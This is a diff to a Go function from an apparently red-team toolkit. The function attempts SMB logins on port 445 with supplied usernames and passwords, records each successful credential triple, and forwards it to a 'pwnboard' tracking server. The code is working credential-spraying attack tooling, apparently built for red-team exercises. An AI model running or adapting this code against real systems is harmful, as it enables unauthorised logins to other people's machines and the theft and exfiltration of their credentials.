@@ -11,14 +11,18 @@ import (
 	"github.com/opt/red-script/internal/pwnboard"
 )
 
+const DEFAULT_PORT int = 445
+const ERR_PREFIX string = "ERROR(smbClient): "
+
 // Attempts to use the provided user and pass to log into SMB on the provided host.
+//	If login is successful, the function will also attempt to alert pwnboard.
 func Connect(host, user, password string, wg *sync.WaitGroup) {
 	defer wg.Done()
 
 	// Attempt to dial SMB on host
-	conn, err := net.Dial("tcp", host)
+	conn, err := net.Dial("tcp", host+":"+fmt.Sprint(DEFAULT_PORT))
 	if err != nil {
-		os.Stderr.WriteString("ERROR: Initial SMB server dial failed.\n")
+		os.Stderr.WriteString(ERR_PREFIX + "Initial SMB server dial failed.\n")
 		os.Stderr.WriteString(err.Error() + "\n")
 		return
 	}
@@ -36,16 +40,16 @@ func Connect(host, user, password string, wg *sync.WaitGroup) {
 	// Redial with smbConn (provided user and pass) to attempt logging into SMB
 	dial, err := smbConn.Dial(conn)
 	if err != nil {
-		os.Stderr.WriteString("ERROR: Could not connect to SMB server.\n")
+		os.Stderr.WriteString(ERR_PREFIX + "Could not connect to SMB server.\n")
 		os.Stderr.WriteString(err.Error() + "\n")
 		return
 	}
 	defer logOff(dial)
 
-	files.WriterChan <- fmt.Sprintf("smb:%s:%s:%s\n", host, user, password)
+	files.WriterChan <- fmt.Sprintf("smb:'%s':'%s':'%s'\n", host, user, password)
 
 	// Send successful login creds to pwnboard
-	pwnboard.SendUpdate(host, fmt.Sprintf("smb:%s:%s:Default creds", user, password))
+	pwnboard.SendUpdate(host, fmt.Sprintf("smb:'%s':'%s':Default creds", user, password))
 }
 
 // Created as a function so that it is easy to defer.
